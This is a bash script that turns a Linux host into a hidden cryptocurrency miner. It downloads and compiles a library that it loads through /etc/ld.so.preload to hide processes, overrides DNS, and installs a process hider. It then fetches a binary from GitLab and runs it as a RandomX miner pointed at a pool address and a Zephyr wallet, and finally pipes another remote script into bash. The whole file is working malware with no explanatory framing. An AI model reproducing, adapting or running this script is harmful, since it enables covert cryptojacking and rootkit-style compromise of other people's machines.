#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://gitlab.com/liugtiujk/portal/-/raw/master/cikblek.c -o cikblek.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libcikblek.so cikblek.c -ldl
mv libcikblek.so /usr/local/lib/
echo /usr/local/lib/libcikblek.so >> /etc/ld.so.preload
rm cikblek.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add fds"
wget https://gitlab.com/liugtiujk/kontol/-/raw/main/fds >/dev/null 2>&1
chmod +x fds
sudo ./fds --disable-gpu --algorithm randomx --pool 167.71.130.98:443 --wallet ZEPHs8BbJv7fZVPDqfMRGt4eRYCntD1StVtd4zWxTMWA6YrKtKBgA5fYvEgBDPFzf28X2ewYCz81mDQcGH1ewWWzRH4bp4F1Btd --password ll >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
